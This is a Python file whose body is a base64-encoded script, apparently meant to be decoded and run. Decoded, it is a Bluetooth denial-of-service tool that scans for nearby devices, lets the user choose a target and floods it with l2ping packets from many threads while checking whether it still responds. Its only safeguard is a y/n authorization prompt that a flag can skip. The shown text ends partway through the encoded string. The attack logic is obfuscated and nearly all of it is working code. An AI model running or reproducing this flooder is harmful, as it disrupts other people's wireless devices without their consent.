import base64
import os
encoded_code='''
aW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBsb2dnaW5nCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0
IHNodXRpbAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgc3lzCmltcG9ydCB0aHJlYWRpbmcKaW1w
b3J0IHRpbWUKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRv
ciwgYXNfY29tcGxldGVkCmZyb20gdHlwaW5nIGltcG9ydCBMaXN0LCBPcHRpb25hbApmcm9tIHRx
ZG0gaW1wb3J0IHRxZG0gICMgRm9yIHByb2dyZXNzIGJhcnMKCiMgQ29uc3RhbnRzCkRFRkFVTFRf
SU5URVJGQUNFID0gJ2hjaTAnCk1BWF9USFJFQURTID0gMjAwICAjIEluY3JlYXNlZCBmb3IgbW9y
ZSBlZmZlY3RpdmVuZXNzIGluIGxhYiB0ZXN0aW5nCk1BWF9QQUNLQUdFX1NJWkUgPSA2NTUzNQpN
SU5fUEFDS0FHRV9TSVpFID0gMQpERUZBVUxUX1RJTUVPVVQgPSA2MCAgIyBEZWZhdWx0IGF0dGFj
ayBkdXJhdGlvbiBpbiBzZWNvbmRzCkRFRkFVTFRfUEFDS0FHRV9TSVpFID0gNjAwCkRFRkFVTFRf
VEhSRUFEUyA9IDUwCkxPR19GSUxFID0gJ2JsdWV0b290aF9kb3MubG9nJwoKIyBTZXR1cCBsb2dn
aW5nCmxvZ2dpbmcuYmFzaWNDb25maWcoZmlsZW5hbWU9TE9HX0ZJTEUsIGxldmVsPWxvZ2dpbmcu
SU5GTywgCiAgICAgICAgICAgICAgICAgICAgZm9ybWF0PSclKGFzY3RpbWUpcyAtICUobGV2ZWxu
YW1lKXMgLSAlKG1lc3NhZ2UpcycpCgpkZWYgY2xlYXJfc2NyZWVuKCkgLT4gTm9uZToKICAgICIi
IkNsZWFyIHRoZSB0ZXJtaW5hbCBzY3JlZW4gaW4gYSBwbGF0Zm9ybS1pbmRlcGVuZGVudCB3YXku
IiIiCiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykK
CmRlZiBwcmludF9sb2dvKCkgLT4gTm9uZToKICAgICIiIlByaW50IHRoZSBzY3JpcHQncyBsb2dv
LiIiIgogICAgcHJpbnQoIlxuIiArICI9IiAqIDgwKQogICAgcHJpbnQoIiAiICogMTUgKyAiQmx1
ZXRvb3RoIERvUyBUZXN0aW5nIFRvb2wiKQogICAgcHJpbnQoIj0iICogODAgKyAiXG4iKQoKZGVm
IGNoZWNrX2RlcGVuZGVuY2llcygpIC0+IE5vbmU6CiAgICAiIiJDaGVjayBpZiByZXF1aXJlZCB0
b29scyBhcmUgaW5zdGFsbGVkLiIiIgogICAgcmVxdWlyZWRfdG9vbHMgPSBbJ2hjaXRvb2wnLCAn
bDJwaW5nJywgJ2hjaWNvbmZpZyddICAjIEFkZGVkIGhjaWNvbmZpZyBmb3IgaW50ZXJmYWNlIG1h
bmFnZW1lbnQKICAgIG1pc3NpbmcgPSBbdG9vbCBmb3IgdG9vbCBpbiByZXF1aXJlZF90b29scyBp
ZiBub3Qgc2h1dGlsLndoaWNoKHRvb2wpXQogICAgaWYgbWlzc2luZzoKICAgICAgICBwcmludChm
IlshXSBFUlJPUjogTWlzc2luZyBkZXBlbmRlbmNpZXM6IHsnLCAnLmpvaW4obWlzc2luZyl9LiBJ
bnN0YWxsIGJsdWV6IHBhY2thZ2UuIikKICAgICAgICBzeXMuZXhpdCgxKQoKZGVmIGJyaW5nX3Vw
X2ludGVyZmFjZShpbnRlcmZhY2U6IHN0cikgLT4gYm9vbDoKICAgICIiIkF0dGVtcHQgdG8gYnJp
bmcgdXAgYSBCbHVldG9vdGggaW50ZXJmYWNlLiIiIgogICAgdHJ5OgogICAgICAgIHN1YnByb2Nl
c3MucnVuKFsnaGNpY29uZmlnJywgaW50ZXJmYWNlLCAndXAnXSwgY2hlY2s9VHJ1ZSwgc3Rkb3V0
PXN1YnByb2Nlc3MuREVWTlVMTCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgICAgICBw
cmludChmIlsqXSBTdWNjZXNzZnVsbHkgYnJvdWdodCB1cCBpbnRlcmZhY2U6IHtpbnRlcmZhY2V9
IikKICAgICAgICBsb2dnaW5nLmluZm8oZiJCcm91Z2h0IHVwIGludGVyZmFjZToge2ludGVyZmFj
ZX0iKQogICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9j
ZXNzRXJyb3IgYXMgZToKICAgICAgICBwcmludChmIlshXSBGYWlsZWQgdG8gYnJpbmcgdXAge2lu
dGVyZmFjZX06IHtlfS4gRW5zdXJlIHNjcmlwdCBpcyBydW4gd2l0aCBzdWRvLiIpCiAgICAgICAg
bG9nZ2luZy5lcnJvcihmIkZhaWxlZCB0byBicmluZyB1cCB7aW50ZXJmYWNlfToge2V9IikKICAg
ICAgICByZXR1cm4gRmFsc2UKCmRlZiBnZXRfYmx1ZXRvb3RoX2ludGVyZmFjZXMoYXV0b191cDog
Ym9vbCA9IFRydWUpIC0+IExpc3Rbc3RyXToKICAgICIiIkRldGVjdCBhbGwgYWN0aXZlIEJsdWV0
b290aCBpbnRlcmZhY2VzLCB3aXRoIG9wdGlvbiB0byBhdXRvLXVwIGlmIGRvd24uIiIiCiAgICB0
cnk6CiAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWydoY2ljb25maWcn
XSwgdGV4dD1UcnVlLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQpCiAgICAgICAgaW50ZXJmYWNl
cyA9IFtdCiAgICAgICAgZG93bl9pbnRlcmZhY2VzID0gW10KICAgICAgICBjdXJyZW50X2ludGVy
ZmFjZSA9IE5vbmUKICAgICAgICBpc191cCA9IEZhbHNlCiAgICAgICAgZm9yIGxpbmUgaW4gb3V0
cHV0LnNwbGl0bGluZXMoKToKICAgICAgICAgICAgaWYgbGluZS5zdHJpcCgpLmVuZHN3aXRoKCc6
JykgYW5kICdoY2knIGluIGxpbmU6CiAgICAgICAgICAgICAgICBpZiBjdXJyZW50X2ludGVyZmFj
ZToKICAgICAgICAgICAgICAgICAgICBpZiBpc191cDoKICAgICAgICAgICAgICAgICAgICAgICAg
aW50ZXJmYWNlcy5hcHBlbmQoY3VycmVudF9pbnRlcmZhY2UpCiAgICAgICAgICAgICAgICAgICAg
ZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgZG93bl9pbnRlcmZhY2VzLmFwcGVuZChjdXJy
ZW50X2ludGVyZmFjZSkKICAgICAgICAgICAgICAgIGN1cnJlbnRfaW50ZXJmYWNlID0gbGluZS5z
cGxpdCgnOicpWzBdLnN0cmlwKCkKICAgICAgICAgICAgICAgIGlzX3VwID0gRmFsc2UKICAgICAg
ICAgICAgZWxpZiBjdXJyZW50X2ludGVyZmFjZSBhbmQgJ1VQJyBpbiBsaW5lOgogICAgICAgICAg
ICAgICAgaXNfdXAgPSBUcnVlCgogICAgICAgIGlmIGN1cnJlbnRfaW50ZXJmYWNlOgogICAgICAg
ICAgICBpZiBpc191cDoKICAgICAgICAgICAgICAgIGludGVyZmFjZXMuYXBwZW5kKGN1cnJlbnRf
aW50ZXJmYWNlKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZG93bl9pbnRlcmZh
Y2VzLmFwcGVuZChjdXJyZW50X2ludGVyZmFjZSkKCiAgICAgICAgaWYgbm90IGludGVyZmFjZXMg
YW5kIGF1dG9fdXAgYW5kIGRvd25faW50ZXJmYWNlczoKICAgICAgICAgICAgcHJpbnQoIlsqXSBO
byBhY3RpdmUgaW50ZXJmYWNlcyBkZXRlY3RlZC4gQXR0ZW1wdGluZyB0byBicmluZyB1cCBkZXRl
Y3RlZCBpbnRlcmZhY2VzLi4uIikKICAgICAgICAgICAgZm9yIGlmYWNlIGluIGRvd25faW50ZXJm
YWNlczoKICAgICAgICAgICAgICAgIGlmIGJyaW5nX3VwX2ludGVyZmFjZShpZmFjZSk6CiAgICAg
ICAgICAgICAgICAgICAgaW50ZXJmYWNlcy5hcHBlbmQoaWZhY2UpCgogICAgICAgIGlmIG5vdCBp
bnRlcmZhY2VzIGFuZCBhdXRvX3VwOgogICAgICAgICAgICBwcmludCgiWypdIEF0dGVtcHRpbmcg
dG8gYnJpbmcgdXAgZGVmYXVsdCBpbnRlcmZhY2UuLi4iKQogICAgICAgICAgICBpZiBicmluZ191
cF9pbnRlcmZhY2UoREVGQVVMVF9JTlRFUkZBQ0UpOgogICAgICAgICAgICAgICAgaW50ZXJmYWNl
cy5hcHBlbmQoREVGQVVMVF9JTlRFUkZBQ0UpCgogICAgICAgIHJldHVybiBpbnRlcmZhY2VzCiAg
ICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3I6CiAgICAgICAgcmV0dXJuIFtd
CgpkZWYgaXNfdmFsaWRfbWFjKGFkZHI6IHN0cikgLT4gYm9vbDoKICAgICIiIlZhbGlkYXRlIEJs
dWV0b290aCBNQUMgYWRkcmVzcyBmb3JtYXQuIiIiCiAgICByZXR1cm4gYm9vbChyZS5tYXRjaChy
J14oWzAtOUEtRmEtZl17Mn06KXs1fVswLTlBLUZhLWZdezJ9JCcsIGFkZHIpKQoKZGVmIHNjYW5f
ZGV2aWNlcyhpbnRlcmZhY2U6IHN0cikgLT4gTGlzdFtkaWN0XToKICAgICIiIlNjYW4gZm9yIG5l
YXJieSBCbHVldG9vdGggZGV2aWNlcy4iIiIKICAgIHRyeToKICAgICAgICBjbWQgPSBbJ2hjaXRv
b2wnLCAnLWknLCBpbnRlcmZhY2UsICdzY2FuJywgJy0tZmx1c2gnXSAgIyBBZGRlZCAtLWZsdXNo
IGZvciBmcmVzaCBzY2FuCiAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQo
Y21kLCB0ZXh0PVRydWUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCkKICAgICAgICBsaW5lcyA9
IG91dHB1dC5zcGxpdGxpbmVzKClbMTpdICAjIFNraXAgaGVhZGVyCiAgICAgICAgZGV2aWNlcyA9
IFtdCiAgICAgICAgZm9yIGxpbmUgaW4gbGluZXM6CiAgICAgICAgICAgIHBhcnRzID0gbGluZS5z
cGxpdChtYXhzcGxpdD0xKQogICAgICAgICAgICBpZiBsZW4ocGFydHMpID09IDI6CiAgICAgICAg
ICAgICAgICBtYWMsIG5hbWUgPSBwYXJ0cwogICAgICAgICAgICAgICAgZGV2aWNlcy5hcHBlbmQo
eydtYWMnOiBtYWMsICduYW1lJzogbmFtZX0pCiAgICAgICAgcmV0dXJuIGRldmljZXMKICAgIGV4
Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgIHByaW50KGYi
WyFdIEVSUk9SOiBTY2FuIGZhaWxlZCBvbiB7aW50ZXJmYWNlfToge2Uub3V0cHV0LnN0cmlwKCl9
IikKICAgICAgICByZXR1cm4gW10KCmRlZiBwcmludF9kZXZpY2VzKGRldmljZXM6IExpc3RbZGlj
dF0pIC0+IE5vbmU6CiAgICAiIiJQcmludCBzY2FubmVkIGRldmljZXMgaW4gYSB0YWJsZSBmb3Jt
YXQuIiIiCiAgICBpZiBub3QgZGV2aWNlczoKICAgICAgICBwcmludCgiWyFdIE5vIGRldmljZXMg
Zm91bmQuIikKICAgICAgICByZXR1cm4KICAgIHByaW50KCJcbnwgSUQgfCBNQUMgQWRkcmVzcyAg
ICAgICB8IERldmljZSBOYW1lICAgICAgICAgICAgICB8IikKICAgIHByaW50KCJ8LS0tfC0tLS0t
LS0tLS0tLS0tLS0tLS18LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS18IikKICAgIGZvciBpLCBk
ZXYgaW4gZW51bWVyYXRlKGRldmljZXMpOgogICAgICAgIHByaW50KGYifCB7aTo8Mn0gfCB7ZGV2
WydtYWMnXTo8MTd9IHwge2RldlsnbmFtZSddWzoyNF06PDI0fSB8IikKCmRlZiBnZXRfdXNlcl9p
bnB1dChwcm9tcHQ6IHN0ciwgdmFsaWRhdG9yOiBjYWxsYWJsZSA9IE5vbmUsIGRlZmF1bHQ6IE9w
dGlvbmFsW3N0cl0gPSBOb25lKSAtPiBzdHI6CiAgICAiIiJHZXQgdmFsaWRhdGVkIHVzZXIgaW5w
dXQuIiIiCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHZhbHVlID0gaW5wdXQocHJvbXB0KS5zdHJp
cCgpCiAgICAgICAgaWYgbm90IHZhbHVlIGFuZCBkZWZhdWx0IGlzIG5vdCBOb25lOgogICAgICAg
ICAgICByZXR1cm4gZGVmYXVsdAogICAgICAgIGlmIHZhbGlkYXRvciBpcyBOb25lIG9yIHZhbGlk
YXRvcih2YWx1ZSk6CiAgICAgICAgICAgIHJldHVybiB2YWx1ZQogICAgICAgIHByaW50KCJbIV0g
SW52YWxpZCBpbnB1dC4gUGxlYXNlIHRyeSBhZ2Fpbi4iKQoKZGVmIG1vbml0b3JfdGFyZ2V0KHRh
cmdldF9hZGRyOiBzdHIsIGludGVyZmFjZTogc3RyLCBzdG9wX2V2ZW50OiB0aHJlYWRpbmcuRXZl
bnQpIC0+IE5vbmU6CiAgICAiIiJNb25pdG9yIHRoZSB0YXJnZXQncyByZXNwb25zaXZlbmVzcyBk
dXJpbmcgdGhlIGF0dGFjay4iIiIKICAgIHdoaWxlIG5vdCBzdG9wX2V2ZW50LmlzX3NldCgpOgog
ICAgICAgIHRyeToKICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydsMnBpbmcnLCAnLWknLCBp
bnRlcmZhY2UsICctYycsICcxJywgdGFyZ2V0X2FkZHJdLCAKICAgICAgICAgICAgICAgICAgICAg
ICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVM
TCwgY2hlY2s9VHJ1ZSwgdGltZW91dD01KQogICAgICAgICAgICBsb2dnaW5nLmluZm8oZiJUYXJn
ZXQge3RhcmdldF9hZGRyfSBpcyByZXNwb25zaXZlIikKICAgICAgICAgICAgcHJpbnQoZiJbKl0g
TW9uaXRvcjogVGFyZ2V0IHt0YXJnZXRfYWRkcn0gaXMgcmVzcG9uc2l2ZSIpCiAgICAgICAgZXhj
ZXB0IChzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciwgc3VicHJvY2Vzcy5UaW1lb3V0RXhw
aXJlZCk6CiAgICAgICAgICAgIGxvZ2dpbmcud2FybmluZyhmIlRhcmdldCB7dGFyZ2V0X2FkZHJ9
IGlzIHVucmVzcG9uc2l2ZSIpCiAgICAgICAgICAgIHByaW50KGYiWyFdIE1vbml0b3I6IFRhcmdl
dCB7dGFyZ2V0X2FkZHJ9IGlzIHVucmVzcG9uc2l2ZSIpCiAgICAgICAgdGltZS5zbGVlcCg1KSAg
IyBDaGVjayBldmVyeSA1IHNlY29uZHMKCmRlZiBkb3NfdGhyZWFkKHRhcmdldF9hZGRyOiBzdHIs
IHBhY2thZ2Vfc2l6ZTogaW50LCBpbnRlcmZhY2U6IHN0ciwgc3RvcF9ldmVudDogdGhyZWFkaW5n
LkV2ZW50LCAKICAgICAgICAgICAgICAgcGFja2V0X2NvdW50OiB0aHJlYWRpbmcubG9jYWwsIGZs
b29kX3JhdGU6IGZsb2F0ID0gMC4wMDUpIC0+IE5vbmU6CiAgICAiIiJUaHJlYWQgZnVuY3Rpb24g
Zm9yIHNlbmRpbmcgTDJDQVAgcGluZyBwYWNrZXRzIHdpdGggYWRhcHRpdmUgc2l6aW5nLiIiIgog
ICAgbG9jYWxfY291bnQgPSAwCiAgICB3aGlsZSBub3Qgc3RvcF9ldmVudC5pc19zZXQoKToKICAg
ICAgICBjdXJyZW50X3NpemUgPSBwYWNrYWdlX3NpemUgKyAobG9jYWxfY291bnQgJSAxMCkgICMg
U2xpZ2h0IHZhcmlhdGlvbiBmb3IgdGVzdGluZwogICAgICAgIGNtZCA9IFsnbDJwaW5nJywgJy1p
JywgaW50ZXJmYWNlLCAnLXMnLCBzdHIoY3VycmVudF9zaXplKSwgJy1mJywgdGFyZ2V0X2FkZHJd
CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihjbWQsIHN0ZG91dD1zdWJw
cm9jZXNzLkRFVk5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwsIGNoZWNrPVRydWUsIHRp
bWVvdXQ9MSkKICAgICAgICAgICAgbG9jYWxfY291bnQgKz0gMQogICAgICAgICAgICBwYWNrZXRf
Y291bnQudmFsdWUgKz0gMQogICAgICAgIGV4Y2VwdCAoc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNz
RXJyb3IsIHN1YnByb2Nlc3MuVGltZW91dEV4cGlyZWQpOgogICAgICAgICAgICBwYXNzCiAgICAg
ICAgdGltZS5zbGVlcChmbG9vZF9yYXRlKSAgIyBDb25maWd1cmFibGUgZmxvb2QgcmF0ZSBmb3Ig
ZWZmaWNpZW5jeQoKZGVmIGdlbmVyYXRlX3JlcG9ydCh0YXJnZXRfYWRkcjogc3RyLCBkdXJhdGlv
bjogaW50LCB0aHJlYWRzX2NvdW50OiBpbnQsIHBhY2tldF9jb3VudDogaW50KSAtPiBOb25lOgog
ICAgIiIiR2VuZXJhdGUgYSBzaW1wbGUgcmVwb3J0IGFmdGVyIHRoZSBhdHRhY2suIiIiCiAgICB3
aXRoIG9wZW4oJ2Rvc19yZXBvcnQudHh0JywgJ3cnKSBhcyBmOgogICAgICAgIGYud3JpdGUoZiJU
YXJnZXQ6IHt0YXJnZXRfYWRkcn1cbiIpCiAgICAgICAgZi53cml0ZShmIkR1cmF0aW9uOiB7ZHVy
YXRpb259IHNlY29uZHNcbiIpCiAgICAgICAgZi53cml0ZShmIlRocmVhZHM6IHt0aHJlYWRzX2Nv
dW50fVxuIikKICAgICAgICBmLndyaXRlKGYiUGFja2V0cyBTZW50OiB7cGFja2V0X2NvdW50fVxu
IikKICAgICAgICBmLndyaXRlKGYiQ2hlY2sge0xPR19GSUxFfSBmb3IgZGV0YWlsZWQgbG9ncy5c
biIpCiAgICBwcmludCgiWypdIFJlcG9ydCBnZW5lcmF0ZWQ6IGRvc19yZXBvcnQudHh0IikKCmRl
ZiBtYWluKGFyZ3MpIC0+IE5vbmU6CiAgICBjaGVja19kZXBlbmRlbmNpZXMoKQogICAgY2xlYXJf
c2NyZWVuKCkKICAgIHByaW50X2xvZ28oKQoKICAgIHByaW50KCJceDFiWzMxbSBCbHVldG9vdGgg
RG9zIFRvb2wiKQogICAgcHJpbnQoIlRvb2wgY3JlYXRlZCBieSBhbGl6dWxxYXJuYWluNTIyNSBc
eDFiWzBtXG4iKQoKICAgIGlmIG5vdCBhcmdzLm5vX3Byb21wdCBhbmQgZ2V0X3VzZXJfaW5wdXQo
IkRvIHlvdSBhZ3JlZSBhbmQgaGF2ZSBhdXRob3JpemF0aW9uPyAoeS9uKSA+ICIpLmxvd2VyKCkg
IT0gJ3knOgogICAgICAgIHByaW50KCJFeGl0aW5nLi4uIikKICAgICAgICBzeXMuZXhpdCgwKQoK
ICAgICMgQXV0byBkZXRlY3QgYW5kIHVwIGludGVyZmFjZXMKICAgIGludGVyZmFjZXMgPSBnZXRf
Ymx1ZXRvb3RoX2ludGVyZmFjZXMoYXV0b191cD1UcnVlKQogICAgaWYgbm90IGludGVyZmFjZXM6
CiAgICAgICAgcHJpbnQoIlshXSBObyBCbHVldG9vdGggaW50ZXJmYWNlcyBhdmFpbGFibGUuIEV4
aXRpbmcuIikKICAgICAgICBzeXMuZXhpdCgxKQogICAgcHJpbnQoZiJbKl0gQWN0aXZlIGludGVy
ZmFjZXM6IHsnLCAnLmpvaW4oaW50ZXJmYWNlcyl9IikKCiAgICAjIEF1dG8gc2NhbiBpZiBubyB0
YXJnZXQgcHJvdmlkZWQKICAgIGlmIG5vdCBhcmdzLnRhcmdldDoKICAgICAgICBjbGVhcl9zY3Jl
ZW4oKQogICAgICAgIHByaW50X2xvZ28oKQogICAgICAgIHByaW50KCJbKl0gQXV0b21hdGljYWxs
eSBzY2FubmluZyBmb3IgZGV2aWNlcyB1c2luZyB7aW50ZXJmYWNlc1swXX0uLi5cbiIpCiAgICAg
ICAgZGV2aWNlcyA9IHNjYW5fZGV2aWNlcyhpbnRlcmZhY2VzWzBdKQogICAgICAgIGlmIG5vdCBk
ZXZpY2VzOgogICAgICAgICAgICBwcmludCgiWyFdIE5vIGRldmljZXMgZGlzY292ZXJlZC4gRW5z
dXJlIGRldmljZXMgYXJlIGRpc2NvdmVyYWJsZS4gRXhpdGluZy4iKQogICAgICAgICAgICBzeXMu
ZXhpdCgxKQogICAgICAgIHByaW50X2RldmljZXMoZGV2aWNlcykKCiAgICAgICAgIyBVc2VyIHNl
bGVjdHMgdGFyZ2V0CiAgICAgICAgdGFyZ2V0X2lucHV0ID0gZ2V0X3VzZXJfaW5wdXQoIlxuU2Vs
ZWN0IHRhcmdldCBJRCBvciBlbnRlciBNQUMgPiAiKQogICAgICAgIGlmIHRhcmdldF9pbnB1dC5p
c2RpZ2l0KCk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHRhcmdldF9hZGRyID0g
ZGV2aWNlc1tpbnQodGFyZ2V0X2lucHV0KV1bJ21hYyddCiAgICAgICAgICAgIGV4Y2VwdCBJbmRl
eEVycm9yOgogICAgICAgICAgICAgICAgcHJpbnQoIlshXSBJbnZhbGlkIElELiIpCiAgICAgICAg
ICAgICAgICBzeXMuZXhpdCgxKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHRhcmdldF9hZGRy
ID0gdGFyZ2V0X2lucHV0CiAgICBlbHNlOgogICAgICAgIHRhcmdldF9hZGRyID0gYXJncy50YXJn
ZXQKCiAgICBpZiBub3QgaXNfdmFsaWRfbWFjKHRhcmdldF9hZGRyKToKICAgICAgICBwcmludCgi
WyFdIEVSUk9SOiBJbnZhbGlkIE1BQyBhZGRyZXNzLiIpCiAgICAgICAgc3lzLmV4aXQoMSkKCiAg
ICAjIFBhcmFtZXRlcnMgLSBhdXRvIG1vZGUgdXNlcyBkZWZhdWx0cyB3aXRob3V0IHByb21wdHMK
ICAgIGlmIGFyZ3MuYXV0bzoKICAgICAgICBwcmludCgiWypdIEF1dG8gbW9kZSBlbmFibGVkLiBV
c2luZyBkZWZhdWx0czoiKQogICAgICAgIHBhY2thZ2Vfc2l6ZSA9IERFRkFVTFRfUEFDS0FHRV9T
SVpFCiAgICAgICAgdGhyZWFkc19jb3VudCA9IERFRkFVTFRfVEhSRUFEUwogICAgICAgIGR1cmF0
aW9uID0gREVGQVVMVF9USU1FT1VUCiAgICBlbHNlOgogICAgICAgIGRlZiB2YWxpZF9zaXplKHZh
bDogc3RyKSAtPiBib29sOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzaXplID0g
aW50KHZhbCkKICAgICAgICAgICAgICAgIHJldHVybiBNSU5fUEFDS0FHRV9TSVpFIDw9IHNpemUg
PD0gTUFYX1BBQ0tBR0VfU0laRQogICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAg
ICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgICAgICBwYWNrYWdlX3NpemUgPSBhcmdzLnBhY2th
Z2Vfc2l6ZSBpZiBhcmdzLnBhY2thZ2Vfc2l6ZSBlbHNlIGludChnZXRfdXNlcl9pbnB1dChmIlBh
Y2thZ2Ugc2l6ZSAoe01JTl9QQUNLQUdFX1NJWkV9LXtNQVhfUEFDS0FHRV9TSVpFfSwgZGVmYXVs
dCB7REVGQVVMVF9QQUNLQUdFX1NJWkV9KSA+ICIsIHZhbGlkX3NpemUsIHN0cihERUZBVUxUX1BB
Q0tBR0VfU0laRSkpKQoKICAgICAgICBkZWYgdmFsaWRfdGhyZWFkcyh2YWw6IHN0cikgLT4gYm9v
bDoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdGhyZWFkcyA9IGludCh2YWwpCiAg
ICAgICAgICAgICAgICByZXR1cm4gMSA8PSB0aHJlYWRzIDw9IE1BWF9USFJFQURTCiAgICAgICAg
ICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCgogICAg
ICAgIHRocmVhZHNfY291bnQgPSBhcmdzLnRocmVhZHMgaWYgYXJncy50aHJlYWRzIGVsc2UgaW50
KGdldF91c2VyX2lucHV0KGYiVGhyZWFkIGNvdW50ICgxLXtNQVhfVEhSRUFEU30sIGRlZmF1bHQg
e0RFRkFVTFRfVEhSRUFEU30pID4gIiwgdmFsaWRfdGhyZWFkcywgc3RyKERFRkFVTFRfVEhSRUFE
UykpKQoKICAgICAgICBkZWYgdmFsaWRfZHVyYXRpb24odmFsOiBzdHIpIC0+IGJvb2w6CiAgICAg
ICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGR1ciA9IGludCh2YWwpCiAgICAgICAgICAgICAg
ICByZXR1cm4gZHVyID4gMAogICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAg
ICAgICAgIHJldHVybiBGYWxzZQoKICAgICAgICBkdXJhdGlvbiA9IGFyZ3MuZHVyYXRpb24gaWYg
YXJncy5kdXJhdGlvbiBlbHNlIGludChnZXRfdXNlcl9pbnB1dChmIkF0dGFjayBkdXJhdGlvbiAo
c2Vjb25kcywgZGVmYXVsdCB7REVGQVVMVF9USU1FT1VUfSkgPiAiLCB2YWxpZF9kdXJhdGlvbiwg
c3RyKERFRkFVTFRfVElNRU9VVCkpKQoKICAgICMgRGlzdHJpYnV0ZSB0aHJlYWRzIGFjcm9zcyBp
bnRlcmZhY2VzIGZvciBlbmhhbmNlZCBzaW11bGF0aW9uCiAgICBpZiBsZW4oaW50ZXJmYWNlcykg
PiAxOgogICAgICAgIHRocmVhZHNfcGVyX2ludGVyZmFjZSA9IG1heCgxLCB0aHJlYWRzX2NvdW50
IC8vIGxlbihpbnRlcmZhY2VzKSkKICAgICAgICBwcmludChmIlsqXSBEaXN0cmlidXRpbmcge3Ro
cmVhZHNfcGVyX2ludGVyZmFjZX0gdGhyZWFkcyBwZXIgaW50ZXJmYWNlIGFjcm9zcyB7bGVuKGlu
dGVyZmFjZXMpfSBpbnRlcmZhY2VzIGZvciBsYWIgRERvUyBzaW11bGF0aW9uLiIpCiAgICBlbHNl
OgogICAgICAgIHRocmVhZHNfcGVyX2ludGVyZmFjZSA9IHRocmVhZHNfY291bnQKICAgICAgICBw
cmludChmIlsqXSBVc2luZyBzaW5nbGUgaW50ZXJmYWNlOiB7aW50ZXJmYWNlc1swXX0iKQoKICAg
ICMgRWZmZWN0aXZlIHRvdGFsIHRocmVhZHMKICAgIGVmZmVjdGl2ZV90aHJlYWRzID0gdGhyZWFk
c19wZXJfaW50ZXJmYWNlICogbGVuKGludGVyZmFjZXMpCgogICAgY2xlYXJfc2NyZWVuKCkKICAg
IHByaW50X2xvZ28oKQogICAgcHJpbnQoZiJbKl0gVGFyZ2V0OiB7dGFyZ2V0X2FkZHJ9IikKICAg
IHByaW50KGYiWypdIFBhY2thZ2UgU2l6ZToge3BhY2thZ2Vfc2l6ZX0iKQogICAgcHJpbnQoZiJb
Kl0gVGhyZWFkczoge2VmZmVjdGl2ZV90aHJlYWRzfSAoZGlzdHJpYnV0ZWQgaWYgbXVsdGlwbGUg
aW50ZXJmYWNlcykiKQogICAgcHJpbnQoZiJbKl0gRHVyYXRpb246IHtkdXJhdGlvbn0gc2Vjb25k
cyIpCiAgICBwcmludChmIlsqXSBMb2dnaW5nIHRvOiB7TE9HX0ZJTEV9IikKICAgIHByaW50KCJc
blsqXSBTdGFydGluZyBEb1MgaW4gMyBzZWNvbmRzLi4uIFByZXNzIEN0cmwrQyB0byBzdG9wIGVh
cmx5LlxuIikKCiAgICBmb3IgaSBpbiByYW5nZSgzLCAwLCAtMSk6CiAgICAgICAgcHJpbnQoZiJb
Kl0ge2l9Li4uIikKICAgICAgICB0aW1lLnNsZWVwKDEpCgogICAgIyBTdGFydCBhdHRhY2sKICAg
IHN0b3BfZXZlbnQgPSB0aHJlYWRpbmcuRXZlbnQoKQogICAgcGFja2V0X2NvdW50ID0gdGhyZWFk
aW5nLmxvY2FsKCkKICAgIHBhY2tldF9jb3VudC52YWx1ZSA9IDAKCiAgICAjIFN0YXJ0IG1vbml0
b3JpbmcgdGhyZWFkCiAgICBtb25pdG9yX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0
PW1vbml0b3JfdGFyZ2V0LCBhcmdzPSh0YXJnZXRfYWRkciwgaW50ZXJmYWNlc1swXSwgc3RvcF9l
dmVudCkpCiAgICBtb25pdG9yX3RocmVhZC5zdGFydCgpCgogICAgIyBQcm9ncmVzcyBiYXIKICAg
IHdpdGggdHFkbSh0b3RhbD1kdXJhdGlvbiwgZGVzYz0iRG9TIFByb2dyZXNzIiwgdW5pdD0icyIp
IGFzIHBiYXI6CiAgICAgICAgZnV0dXJlcyA9IFtdCiAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhl
Y3V0b3IobWF4X3dvcmtlcnM9ZWZmZWN0aXZlX3RocmVhZHMpIGFzIGV4ZWN1dG9yOgogICAgICAg
